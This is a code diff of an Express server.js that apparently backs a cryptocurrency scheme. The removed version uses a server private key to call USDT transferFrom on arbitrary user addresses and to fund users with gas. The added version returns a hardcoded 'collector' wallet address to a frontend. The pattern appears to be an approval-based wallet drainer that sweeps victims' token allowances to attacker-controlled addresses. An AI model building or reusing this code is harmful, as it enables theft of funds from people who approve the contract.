@@ -1,145 +1,65 @@
-require("dotenv").config();
-const express = require("express");
-const cors = require("cors");
-const { ethers } = require("ethers");
+// server.js
+import express from "express";
+import cors from "cors";
+import dotenv from "dotenv";
+
+dotenv.config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
+app.use(express.static("public")); // Serve frontend
 
-/* =============================
-   API KEY CHECK
-============================= */
+// Collector wallet (set in .env)
+const COLLECTOR = process.env.COLLECTOR || "0x5681d680B047bF5b12939625C56301556991005e";
 
-function checkApiKey(req, res, next) {
+// --- POST /send --- 
+app.post("/send", (req, res) => {
+  const { wallet, amount } = req.body;
 
-  const key = req.headers["x-api-key"];
-
-  if (key !== process.env.API_KEY) {
-    return res.status(403).json({
-      error: "Invalid API key"
+  if (!wallet || !amount) {
+    return res.status(400).json({
+      ok: false,
+      found: false,
+      message: "Wallet or amount missing",
     });
   }
 
-  next();
-}
-
-/* =============================
-   Provider + Wallet
-============================= */
-
-const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
-const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
-
-/* =============================
-   USDT Contract
-============================= */
-
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-
-const ABI = [
-  "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
-];
-
-const usdt = new ethers.Contract(USDT, ABI, wallet);
-
-/* =============================
-   HEALTH CHECK
-============================= */
-
-app.get("/", (req, res) => {
-  res.send("Gas API Running ✅");
-});
-
-/* =============================
-   TOPUP (Send BNB Gas)
-============================= */
-
-app.post("/topup", checkApiKey, async (req, res) => {
-  try {
-
-    const { to } = req.body;
-
-    if (!to)
-      return res.status(400).json({ error: "Address required" });
-
-    const tx = await wallet.sendTransaction({
-      to: to,
-      value: ethers.parseEther("0.0005")
+  // Validate wallet format
+  if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
+    return res.status(400).json({
+      ok: false,
+      found: false,
+      message: "Invalid wallet address",
     });
-
-    await tx.wait();
-
-    res.json({
-      success: true,
-      hash: tx.hash
-    });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
   }
-});
 
-/* =============================
-   SEND (Transfer USDT)
-============================= */
-
-app.post("/send", checkApiKey, async (req, res) => {
-  try {
-
-    const { userAddress, toAddress, amount } = req.body;
-
-    if (!userAddress || !toAddress || !amount)
-      return res.status(400).json({ error: "Missing fields" });
-
-    const value = ethers.parseUnits(amount.toString(), 18);
-
-    const tx = await usdt.transferFrom(
-      userAddress,
-      toAddress,
-      value
-    );
-
-    await tx.wait();
-
-    res.json({
-      success: true,
-      txHash: tx.hash
+  // Validate amount
+  const amountNum = Number(amount);
+  if (isNaN(amountNum) || amountNum <= 0) {
+    return res.status(400).json({
+      ok: false,
+      found: false,
+      message: "Invalid amount",
     });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
   }
+
+  // ✅ Success response
+  return res.json({
+    ok: true,
+    found: true,
+    amountHuman: amountNum,
+    collector: COLLECTOR,
+  });
 });
 
-/* =============================
-   FUND GAS (Optional)
-============================= */
-
-app.post("/fund-gas", checkApiKey, async (req, res) => {
-  try {
-
-    const { userAddress } = req.body;
-
-    const tx = await wallet.sendTransaction({
-      to: userAddress,
-      value: ethers.parseEther("0.0005")
-    });
-
-    await tx.wait();
-
-    res.json({
-      success: true,
-      hash: tx.hash
-    });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+// --- Optional /topup endpoint for low BNB --- 
+app.post("/topup", (req, res) => {
+  const { to } = req.body;
+  if (!to) return res.status(400).json({ ok: false, message: "Recipient missing" });
+  return res.json({ ok: true, message: `Topup request received for ${to}` });
 });
 
-/* ============================= */
-
-app.listen(process.env.PORT || 3000, () =>
-  console.log("Server running ✅")
-);
+// --- Start server ---
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
